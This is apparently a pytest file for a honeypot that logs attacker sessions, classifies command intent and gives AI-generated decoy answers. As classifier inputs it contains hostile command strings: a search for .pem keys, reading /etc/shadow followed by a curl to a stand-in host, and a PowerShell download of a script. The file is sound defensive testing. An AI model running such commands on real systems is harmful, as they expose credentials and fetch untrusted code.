import asyncio
import sqlite3
import time
from dataclasses import replace

from honeypot.config import HoneypotSettings, default_services
from honeypot.deception import GeminiDeceptionEngine, IntentClassifier
from honeypot.models import DecoySession, TelemetryEvent
from honeypot.store import TelemetryStore


def test_store_records_session_event_and_investigation(tmp_path):
    database_path = tmp_path / "telemetry.db"
    store = TelemetryStore(database_path)
    session = DecoySession(
        session_id="ses_test",
        source_ip="192.0.2.20",
        source_port=41000,
        destination_port=2323,
        service="Telnet",
        protocol="telnet",
        persona="test appliance",
    )
    store.create_session(session)
    event = TelemetryEvent(
        session_id=session.session_id,
        event_type="CREDENTIAL_DISCOVERY",
        severity="critical",
        direction="inbound",
        content="find / -name '*.pem'",
        byte_count=21,
    )
    store.record_event(event)
    store.record_event(
        TelemetryEvent(
            session_id=session.session_id,
            event_type="DECOY_AI_RESPONSE",
            severity="info",
            direction="outbound",
            content="fictional response",
            byte_count=19,
        )
    )
    store.record_event(
        TelemetryEvent(
            session_id=session.session_id,
            event_type="SOC_ANNOTATION",
            severity="info",
            direction="system",
            content="analysis complete",
        )
    )
    store.save_investigation(
        event_id=event.event_id,
        session_id=session.session_id,
        risk_score=91,
        risk_level="critical",
        intent="Credential access",
        intent_confidence=0.94,
        mitre=["T1552"],
        rationale="decoy credential search",
        investigation={"ok": True},
    )

    saved = store.get_session(session.session_id)
    assert saved is not None
    assert saved["bytes_in"] == 21
    assert saved["bytes_out"] == 19
    assert saved["interactions"] == 1
    assert saved["risk_score"] == 91
    assert saved["analysis"]["mitre"] == ["T1552"]
    metrics = store.metrics()
    assert metrics["unique_sources"] == 1
    assert metrics["interactions_captured"] == 1
    assert metrics["telemetry_events"] == 3
    assert store.export_session(session.session_id)["events"][0]["sha256"]
    store.close()

    # Existing databases with the former inflated value are repaired on open.
    with sqlite3.connect(database_path) as connection:
        connection.execute("UPDATE sessions SET interactions = 20")
    reopened = TelemetryStore(database_path)
    assert reopened.get_session(session.session_id)["interactions"] == 1
    reopened.close()


def test_intent_and_fallback_never_execute(tmp_path):
    settings = HoneypotSettings(
        database_path=tmp_path / "unused.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        services=tuple(replace(item, port=0) for item in default_services()),
    )
    engine = GeminiDeceptionEngine(settings)
    result = IntentClassifier.classify("cat /etc/shadow && curl http://bad.invalid/x")
    assert result.event_type == "PAYLOAD_TRANSFER"
    assert result.severity == "critical"
    assert (
        IntentClassifier.classify("Invoke-WebRequest http://lab.invalid/tool.ps1").event_type
        == "PAYLOAD_TRANSFER"
    )
    assert (
        IntentClassifier.classify("Get-Process | Select-Object Name").event_type
        == "SYSTEM_DISCOVERY"
    )
    response = engine._fallback(default_services()[1], "whoami", {})
    assert response == "backup"


def test_configured_response_delay_is_applied(tmp_path):
    settings = HoneypotSettings(
        database_path=tmp_path / "delay.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        min_response_delay_seconds=0.02,
        max_response_delay_seconds=0.02,
    )
    engine = GeminiDeceptionEngine(settings)
    started = time.perf_counter()
    _, metadata = asyncio.run(
        engine.respond(
            session_id="ses_delay",
            profile=default_services()[1],
            attacker_input="whoami",
        )
    )

    assert time.perf_counter() - started >= 0.018
    assert metadata["artificial_delay_ms"] == 20
